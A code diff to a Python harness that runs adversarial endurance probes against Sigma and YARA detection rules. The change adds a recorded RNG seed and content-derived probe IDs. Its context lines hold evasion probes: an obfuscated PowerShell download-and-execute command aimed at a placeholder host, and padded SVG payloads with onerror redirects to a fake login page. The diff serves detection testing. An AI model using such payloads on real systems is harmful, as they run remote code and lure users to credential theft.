@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import argparse
 import datetime
+import hashlib
 import http.server
 import json
 import logging
@@ -78,6 +79,11 @@ STOP_FILE = RESULTS_DIR / "STOP_ENDURANCE"
 logger = logging.getLogger("swarm.endurance")
 
 
+#: Default RNG seed for probe selection. Recorded in the run state, so a run is reproducible
+#: from (seed, iterations) instead of being an unrecorded draw.
+DEFAULT_SEED = 20260910
+
+
 class EnduranceRunner:
     """Orchestrates an unattended, continuous multi-pattern adversarial endurance run."""
 
@@ -89,6 +95,7 @@ class EnduranceRunner:
         resume: bool = False,
         results_dir: Optional[Path] = None,
         stop_file: Optional[Path] = None,
+        seed: int = DEFAULT_SEED,
     ) -> None:
         self.pace = pace_seconds
         self.serve_workbench = serve_workbench
@@ -104,6 +111,11 @@ class EnduranceRunner:
         # Observation-record layer: append-only JSONL; aggregates derive from it
         stamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
         self.run_id = f"endur-{stamp}-{uuid.uuid4().hex[:6]}"
+        # The probe sequence is drawn from an explicitly seeded generator, and the seed is
+        # recorded in the run state, so a run is reproducible from (seed, iterations) rather
+        # than being a fresh unrecorded draw each time.
+        self.seed = seed
+        self.rng = random.Random(seed)
         self._record_start_seq = 0
         self.record_writer: Optional[RecordWriter] = None
 
@@ -455,8 +467,11 @@ class EnduranceRunner:
             ("cmdlet_split", 'powershell.exe -c "&(\'Inv\'+\'oke-RestMethod\') https://cdn.delivery.stage.invalid/update.ps1 | iex"', "Cluster B: Argument Masking & Parameter Aliasing"),
         ]
 
-        name, cmd, cluster = random.choice(lolbins)
-        var_id = f"proc-{uuid.uuid4().hex[:8]}"
+        name, cmd, cluster = self.rng.choice(lolbins)
+        # Content-derived id: identical probes get identical ids, and the ordinal keeps
+        # distinct observations of the same probe distinguishable. uuid4 made every run
+        # unreproducible.
+        var_id = f"proc-{hashlib.sha256(f'{name}|{cmd}|{self.total_probes}'.encode()).hexdigest()[:8]}"
         variant = Variant(
             id=var_id,
             target_type="sigma",
@@ -493,7 +508,7 @@ class EnduranceRunner:
             [2, 4],       # Execution + Credential Access bypass
             [1, 2, 4],    # Compound multi-stage bypass
         ]
-        evasions = random.choice(profiles)
+        evasions = self.rng.choice(profiles)
         camp_num = self.campaigns_count + 1
 
         result = self.campaign_orchestrator.run_campaign(
@@ -622,7 +637,7 @@ class EnduranceRunner:
         self.current_pattern_suite = "Active-Content SVG Parser Differentials (YARA)"
 
         paddings = [512, 1024, 1500, 2048, 3072, 4096, 4500, 6000, 8192]
-        pad = random.choice(paddings)
+        pad = self.rng.choice(paddings)
         prefix = f"<!-- {'P' * pad} -->\n" if pad > 0 else ""
 
         modes = [
@@ -634,7 +649,7 @@ class EnduranceRunner:
             ("onerror_image_redirect", f'{prefix}<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="location.replace(\'https://auth.stage.invalid/login\')"/></svg>', "Cluster B: Argument Masking & Parameter Aliasing"),
         ]
 
-        mode_name, payload, cluster = random.choice(modes)
+        mode_name, payload, cluster = self.rng.choice(modes)
         variant = Variant(
             id=f"svg-{uuid.uuid4().hex[:8]}",
             target_type="yara",
@@ -656,8 +671,8 @@ class EnduranceRunner:
         if not valid_fixtures:
             return
 
-        corpus = random.choice(valid_fixtures)
-        window = random.choice([30, 60, 120, 300])
+        corpus = self.rng.choice(valid_fixtures)
+        window = self.rng.choice([30, 60, 120, 300])
         is_benign = "benign" in corpus.name.lower()
 
         try:
@@ -980,6 +995,7 @@ class EnduranceRunner:
 
         state = {
             "status": "RUNNING" if self.running and not self.stop_requested else "STOPPED",
+            "seed": self.seed,
             "ledger_complete": not getattr(self, "ledger_degraded", False),
             "ledger_error": getattr(self, "ledger_error", None),
             "start_time": self.start_time.isoformat(),
